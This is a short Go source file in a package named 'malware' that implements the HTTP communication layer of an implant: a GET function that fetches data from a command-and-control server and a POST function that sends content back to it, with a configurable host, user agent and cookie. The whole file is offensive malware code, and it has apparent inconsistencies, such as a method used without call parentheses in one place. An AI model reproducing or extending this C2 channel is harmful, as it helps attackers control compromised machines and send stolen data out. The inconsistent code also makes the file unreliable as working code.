package malware

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"time"
)

// getRequest does a get request to the C2
func getRequest(config Config) ([]byte, error) {
	var body []byte
	c := http.Client{Timeout: time.Duration(3) * time.Second}
	target := fmt.Sprintf("%s/%s", config.getHost, config.getGetEndpoint)
	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		return body, err
	}
	req.Header.Add("User-Agent", config.getUserAgent())
	if config.getCookie() != "" {
		req.Header.Add("Cookie", config.getCookie())
	}
	resp, err := c.Do(req)
	if err != nil {
		return nil, err
	}
	body, err = io.ReadAll(resp.Body)
	if err != nil {
		return body, err
	}
	return body, nil
}

// postRequest does a post request to the C2
func postRequest(content []byte, endpoint string, config Config) ([]byte, error) {
	var body []byte
	target := fmt.Sprintf("%s/%s", config.getHost(), endpoint)
	c := http.Client{Timeout: time.Duration(3) * time.Second}
	req, err := http.NewRequest("POST", target, bytes.NewBuffer(content))
	if err != nil {
		return body, err
	}
	req.Header.Add("User-Agent", config.getUserAgent())
	resp, err := c.Do(req)
	if err != nil {
		return nil, err
	}
	body, err = io.ReadAll(resp.Body)
	if err != nil {
		return body, err
	}
	return body, nil
}
